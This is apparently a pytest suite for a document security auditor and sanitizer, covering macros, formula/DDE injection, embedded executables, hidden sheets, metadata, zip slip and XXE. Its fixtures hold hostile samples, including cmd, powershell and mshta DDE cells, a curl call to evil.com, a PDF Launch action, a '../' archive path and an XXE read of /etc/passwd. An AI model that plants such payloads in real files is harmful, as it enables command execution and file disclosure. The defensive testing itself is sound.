# -*- coding: utf-8 -*-
"""
tests/test_document_security.py — Enterprise Document Security & Sanitizer Test Suite.
Validates Cloudflare-seeded defensive security audit standards (ERR_SEC_001–005).
"""

from __future__ import annotations

import csv
import io
import json
import os
import tempfile
import zipfile
import xml.etree.ElementTree as ET
import pytest

from core.security.document_auditor import DocumentSecurityAuditor, SecurityAuditReport
from core.security.sanitizer import DocumentSanitizer
from tools.unified_qa_diagnostic import DocumentSecurityDiagnosticEngine, run_pipeline
from server.mcp_server import handle_rpc_request


class TestDocumentSecuritySuite:
    """Enterprise test suite verifying Cloudflare security audit standards."""

    # -------------------------------------------------------------------------
    # 1. ERR_SEC_001: Macro & Malicious Execution
    # -------------------------------------------------------------------------
    def test_01_macro_stream_detection(self, tmp_path):
        """Verifies detection of vbaProject.bin in OpenXML documents."""
        doc_path = str(tmp_path / "malicious_macro.docm")
        with zipfile.ZipFile(doc_path, "w") as zf:
            zf.writestr("[Content_Types].xml", "<Types></Types>")
            zf.writestr("word/document.xml", "<w:document></w:document>")
            zf.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1dummy vba stream")

        auditor = DocumentSecurityAuditor()
        report = auditor.audit_file(doc_path)
        assert not report.is_clean
        codes = [f["invariant_code"] for f in report.findings["confirmed"]]
        assert "ERR_SEC_001" in codes
        assert any("vbaProject.bin" in f["location"] for f in report.findings["confirmed"])

    def test_02_pdf_launch_action_detection(self, tmp_path):
        """Verifies detection of PDF /Launch and /JavaScript actions."""
        pdf_path = str(tmp_path / "malicious.pdf")
        with open(pdf_path, "wb") as f:
            f.write(b"%PDF-1.4\n1 0 obj\n<< /Type /Action /S /Launch /F (calc.exe) >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF")

        auditor = DocumentSecurityAuditor()
        report = auditor.audit_file(pdf_path)
        codes = [f["invariant_code"] for f in report.findings["confirmed"]]
        assert "ERR_SEC_001" in codes

    # -------------------------------------------------------------------------
    # 2. ERR_SEC_002: Formula / DDE Injection & Sanitization
    # -------------------------------------------------------------------------
    def test_03_csv_formula_injection_detection(self, tmp_path):
        """Verifies detection of formula injection patterns in CSV files."""
        csv_path = str(tmp_path / "payload.csv")
        with open(csv_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["ID", "Name", "Payload"])
            writer.writerow(["1", "Benign", "Normal User"])
            writer.writerow(["2", "Attacker", "=cmd|' /C calc'!A1"])
            writer.writerow(["3", "PowerShell", "+powershell|' -c calc'!A1"])
            writer.writerow(["4", "Mshta", "@mshta|'javascript:alert(1)'!A1"])

        auditor = DocumentSecurityAuditor()
        report = auditor.audit_file(csv_path)
        assert not report.is_clean
        confirmed = report.findings["confirmed"]
        assert len(confirmed) >= 1
        assert "dangerous cell(s)" in confirmed[0]["evidence"]
        assert all(f["invariant_code"] == "ERR_SEC_002" for f in confirmed)

    def test_04_csv_formula_defusing_sanitizer(self, tmp_path):
        """Verifies non-destructive defusing by prepending single quote without data loss."""
        csv_path = str(tmp_path / "input.csv")
        out_path = str(tmp_path / "input_sanitized.csv")
        with open(csv_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Name", "Code"])
            writer.writerow(["Alice", "=cmd|' /C calc'!A1"])
            writer.writerow(["Bob", "@curl|http://evil.com!A1"])

        sanitizer = DocumentSanitizer()
        res = sanitizer.sanitize(csv_path, output_path=out_path)
        assert res["success"]
        assert res["metrics"]["defused_formulas"] >= 2

        with open(out_path, "r", encoding="utf-8") as f:
            reader = list(csv.reader(f))
            assert reader[1][1].startswith("'=")
            assert "calc" in reader[1][1]
            assert reader[2][1].startswith("'@")

    def test_05_excel_formula_injection_detection_and_repair(self, tmp_path):
        """Verifies spreadsheet formula injection inside xl/worksheets/sheet1.xml."""
        xlsx_path = str(tmp_path / "sheet_payload.xlsx")
        sheet_xml = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">\n'
            '  <sheetData>\n'
            '    <row r="1"><c r="A1" t="s"><v>Header</v></c></row>\n'
            '    <row r="2"><c r="A2"><f>cmd|\' /C calc\'!A1</f><v>0</v></c></row>\n'
            '  </sheetData>\n'
            '</worksheet>'
        )
        with zipfile.ZipFile(xlsx_path, "w") as zf:
            zf.writestr("[Content_Types].xml", "<Types></Types>")
            zf.writestr("xl/worksheets/sheet1.xml", sheet_xml)

        auditor = DocumentSecurityAuditor()
        report = auditor.audit_file(xlsx_path)
        assert not report.is_clean
        assert any(f["invariant_code"] == "ERR_SEC_002" for f in report.findings["confirmed"])

        # Sanitize and verify defused formula
        san_path = str(tmp_path / "sheet_sanitized.xlsx")
        sanitizer = DocumentSanitizer()
        res = sanitizer.sanitize(xlsx_path, output_path=san_path)
        assert res["success"]

        with zipfile.ZipFile(san_path, "r") as zf:
            repaired_xml = zf.read("xl/worksheets/sheet1.xml").decode("utf-8")
            assert "'cmd|" in repaired_xml

    # -------------------------------------------------------------------------
    # 3. ERR_SEC_003: Dangerous OLE Packages & Binary Embeddings
    # -------------------------------------------------------------------------
    def test_06_embedded_pe_executable_detection(self, tmp_path):
        """Verifies detection of embedded Windows executables (MZ header) in OLE objects."""
        doc_path = str(tmp_path / "ole_trojan.docx")
        pe_content = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"\x00" * 100
        with zipfile.ZipFile(doc_path, "w") as zf:
            zf.writestr("[Content_Types].xml", "<Types></Types>")
            zf.writestr("word/document.xml", "<w:document></w:document>")
            zf.writestr("word/embeddings/oleObject1.bin", pe_content)

        auditor = DocumentSecurityAuditor()
        report = auditor.audit_file(doc_path)
        assert not report.is_clean
        codes = [f["invariant_code"] for f in report.findings["confirmed"]]
        assert "ERR_SEC_003" in codes
        assert any(f["severity"] == "CRITICAL" for f in report.findings["confirmed"])

    # -------------------------------------------------------------------------
    # 4. ERR_SEC_004: Hidden PII & Metadata Leakage & VeryHidden Sheets
    # -------------------------------------------------------------------------
    def test_07_pii_metadata_scrubbing(self, tmp_path):
        """Verifies detection and scrubbing of author metadata in docProps/core.xml."""
        doc_path = str(tmp_path / "confidential.docx")
        core_xml = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
            'xmlns:dc="http://purl.org/dc/elements/1.1/">\n'
            '  <dc:creator>John Doe (Senior Architect)</dc:creator>\n'
            '  <cp:lastModifiedBy>Jane Smith</cp:lastModifiedBy>\n'
            '</cp:coreProperties>'
        )
        with zipfile.ZipFile(doc_path, "w") as zf:
            zf.writestr("[Content_Types].xml", "<Types></Types>")
            zf.writestr("word/document.xml", "<w:document></w:document>")
            zf.writestr("docProps/core.xml", core_xml)

        auditor = DocumentSecurityAuditor()
        report = auditor.audit_file(doc_path)
        pii_findings = [f for f in report.findings["confirmed"] if f["invariant_code"] == "ERR_SEC_004"]
        assert len(pii_findings) >= 1

        san_path = str(tmp_path / "scrubbed.docx")
        sanitizer = DocumentSanitizer()
        res = sanitizer.sanitize(doc_path, output_path=san_path, strip_metadata=True)
        assert res["success"]

        with zipfile.ZipFile(san_path, "r") as zf:
            clean_xml = zf.read("docProps/core.xml").decode("utf-8")
            assert "John Doe" not in clean_xml
            assert "Jane Smith" not in clean_xml

    def test_08_veryhidden_worksheet_detection_and_restore(self, tmp_path):
        """Verifies detection of state='veryHidden' sheets and restoring visibility."""
        xlsx_path = str(tmp_path / "stealth.xlsx")
        wb_xml = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">\n'
            '  <sheets>\n'
            '    <sheet name="VisibleSheet" sheetId="1" r:id="rId1"/>\n'
            '    <sheet name="SecretSalaries" sheetId="2" state="veryHidden" r:id="rId2"/>\n'
            '  </sheets>\n'
            '</workbook>'
        )
        with zipfile.ZipFile(xlsx_path, "w") as zf:
            zf.writestr("[Content_Types].xml", "<Types></Types>")
            zf.writestr("xl/workbook.xml", wb_xml)
            zf.writestr("xl/worksheets/sheet1.xml", "<worksheet></worksheet>")
            zf.writestr("xl/worksheets/sheet2.xml", "<worksheet></worksheet>")

        auditor = DocumentSecurityAuditor()
        report = auditor.audit_file(xlsx_path)
        assert any(f["invariant_code"] == "ERR_SEC_004" and "veryhidden" in (f["title"] + " " + f["evidence"]).lower() for f in report.findings["confirmed"])

        san_path = str(tmp_path / "stealth_restored.xlsx")
        sanitizer = DocumentSanitizer()
        res = sanitizer.sanitize(xlsx_path, output_path=san_path, unhide_sheets=True)
        assert res["success"]
        assert res["metrics"]["unhidden_sheets"] >= 1

        with zipfile.ZipFile(san_path, "r") as zf:
            restored_xml = zf.read("xl/workbook.xml").decode("utf-8")
            assert "veryHidden" not in restored_xml

    # -------------------------------------------------------------------------
    # 5. ERR_SEC_005: Safe XML Parsing & Zip Slip Traversal
    # -------------------------------------------------------------------------
    def test_09_zip_slip_traversal_detection(self, tmp_path):
        """Verifies detection of path traversal '../' inside archive member names."""
        doc_path = str(tmp_path / "zip_slip.docx")
        with zipfile.ZipFile(doc_path, "w") as zf:
            zf.writestr("[Content_Types].xml", "<Types></Types>")
            zf.writestr("word/../../evil.sh", b"#!/bin/bash\necho evil\n")

        auditor = DocumentSecurityAuditor()
        report = auditor.audit_file(doc_path)
        assert any(f["invariant_code"] == "ERR_SEC_005" for f in report.findings["confirmed"])

    def test_10_xxe_dtd_entity_detection(self, tmp_path):
        """Verifies detection of XML External Entity (XXE) and external DTD declarations."""
        xml_path = str(tmp_path / "xxe_doc.xml")
        payload = (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
            '<foo>&xxe;</foo>'
        )
        with open(xml_path, "w", encoding="utf-8") as f:
            f.write(payload)

        auditor = DocumentSecurityAuditor()
        report = auditor.audit_file(xml_path)
        assert any(f["invariant_code"] == "ERR_SEC_005" for f in report.findings["confirmed"])

    # -------------------------------------------------------------------------
    # 6. Quality Gate 13 & Diagnostic Engine Integration
    # -------------------------------------------------------------------------
    def test_11_gate_13_diagnostic_engine_integration(self, tmp_path):
        """Verifies DocumentSecurityDiagnosticEngine returns DiagnosticIssue format."""
        csv_path = str(tmp_path / "test_diag.csv")
        with open(csv_path, "w", newline="", encoding="utf-8") as f:
            f.write("A,B\n1,=cmd|' /C calc'!A1\n")

        issues, metrics = DocumentSecurityDiagnosticEngine.diagnose(csv_path)
        assert len(issues) >= 1
        issue = issues[0]
        assert issue.domain == "SECURITY"
        assert issue.code == "ERR_SEC_002"
        assert issue.severity == "CRITICAL"
        assert issue.fixable

        # Test repair via Gate 13
        repaired_path = str(tmp_path / "test_diag_fixed.csv")
        ok, actions = DocumentSecurityDiagnosticEngine.repair(csv_path, repaired_path)
        assert ok
        assert len(actions) >= 1

    def test_12_run_pipeline_cli_security_flag(self, tmp_path):
        """Verifies unified QA diagnostic pipeline CLI flag --security and --sanitize."""
        csv_path = str(tmp_path / "cli_test.csv")
        with open(csv_path, "w", newline="", encoding="utf-8") as f:
            f.write("A,B\n1,=powershell|' -c calc'!A1\n")

        # Exit code should be 2 because CRITICAL security issue was detected
        exit_code = run_pipeline(["--file", csv_path, "--security", "--format", "json"])
        assert exit_code == 2

    # -------------------------------------------------------------------------
    # 7. MCP Server Tool #23 (doc_security_audit)
    # -------------------------------------------------------------------------
    def test_13_mcp_tool_security_audit_clean_file(self, tmp_path):
        """Verifies doc_security_audit MCP tool reports clean on benign file."""
        csv_path = str(tmp_path / "clean.csv")
        with open(csv_path, "w", newline="", encoding="utf-8") as f:
            f.write("ID,Name,Role\n1,Alice,Developer\n2,Bob,Reviewer\n")

        req = {
            "jsonrpc": "2.0",
            "id": 201,
            "method": "tools/call",
            "params": {
                "name": "doc_security_audit",
                "arguments": {
                    "file_path": csv_path,
                    "sanitize": False
                }
            }
        }
        res = handle_rpc_request(req)
        assert res is not None
        assert not res["result"]["isError"]
        data = json.loads(res["result"]["content"][0]["text"])
        assert data["success"]
        assert data["is_clean"]
        assert data["critical_count"] == 0

    def test_14_mcp_tool_security_audit_and_sanitize(self, tmp_path):
        """Verifies doc_security_audit MCP tool successfully sanitizes threats."""
        csv_path = str(tmp_path / "threat.csv")
        with open(csv_path, "w", newline="", encoding="utf-8") as f:
            f.write("A,B\n1,=cmd|' /C calc'!A1\n")

        san_target = str(tmp_path / "threat_cleaned.csv")
        req = {
            "jsonrpc": "2.0",
            "id": 202,
            "method": "tools/call",
            "params": {
                "name": "doc_security_audit",
                "arguments": {
                    "file_path": csv_path,
                    "sanitize": True,
                    "output_path": san_target
                }
            }
        }
        res = handle_rpc_request(req)
        assert res is not None
        data = json.loads(res["result"]["content"][0]["text"])
        assert data["success"]
        assert not data["is_clean"]
        assert data["critical_count"] >= 1
        assert "sanitization" in data
        assert os.path.exists(san_target)

    # -------------------------------------------------------------------------
    # 8. Clean Benign Document Verification
    # -------------------------------------------------------------------------
    def test_15_clean_openxml_document_passes_audit(self, tmp_path):
        """Verifies standard benign DOCX without threats passes 100% clean."""
        doc_path = str(tmp_path / "benign.docx")
        with zipfile.ZipFile(doc_path, "w") as zf:
            zf.writestr("[Content_Types].xml", "<Types></Types>")
            zf.writestr("word/document.xml", "<w:document><w:body><w:p><w:r><w:t>Hello World</w:t></w:r></w:p></w:body></w:document>")

        auditor = DocumentSecurityAuditor()
        report = auditor.audit_file(doc_path)
        assert report.is_clean
        assert report.critical_count == 0
        assert report.warning_count == 0
        assert len(report.findings["confirmed"]) == 0
